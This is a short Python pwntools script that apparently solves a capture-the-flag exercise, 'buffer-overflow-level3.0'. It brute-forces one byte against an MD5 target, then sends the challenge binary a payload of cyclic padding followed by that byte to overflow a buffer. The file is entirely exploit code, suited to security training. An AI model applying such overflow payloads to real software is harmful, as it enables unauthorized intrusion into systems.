#!/usr/bin/python

import pwn
from hashlib import md5

target_md5 = "7ccc02c40219c5c6522a377499a960ec"
data1 = b"\x00"
data2 = b"3173711194034543fb6d58060b698fd99b2587a0fefd0ff420abaaaff70b594" + b"\x00" * 0xC0

for i in range(0x100):
    data1 = i.to_bytes(length=1, byteorder="little")
    if (md5(data1+data2).hexdigest() == target_md5):
        break
print(data1)

proc = pwn.process("/challenge/buffer-overflow-level3.0")

payload = pwn.cyclic(0x20) + data1
print(payload)
proc.send_raw(payload)
print(proc.recv())